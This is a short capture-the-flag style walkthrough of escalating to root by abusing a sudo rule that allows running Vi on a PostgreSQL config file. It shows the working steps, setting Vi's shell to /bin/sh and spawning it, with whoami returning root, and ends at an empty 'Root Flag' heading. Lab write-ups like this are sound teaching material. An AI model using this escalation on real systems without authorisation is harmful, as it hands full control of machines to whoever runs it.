# Understanding Vi

Vi (or Vim) is a terminal-based text editor commonly installed on Linux systems.

Although designed for editing files, it also contains functionality that can interact with the operating system.

When a user can launch Vi with elevated privileges, it can sometimes be leveraged to execute commands with those privileges.

---

# Privilege Escalation

Launch the allowed command:

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Inside Vi:

```vim
:set shell=/bin/sh
```

Then:

```vim
:shell
```

Verify access:

```bash
whoami
```

Output:

```text
root
```

Root access obtained.

---

# Root Flag

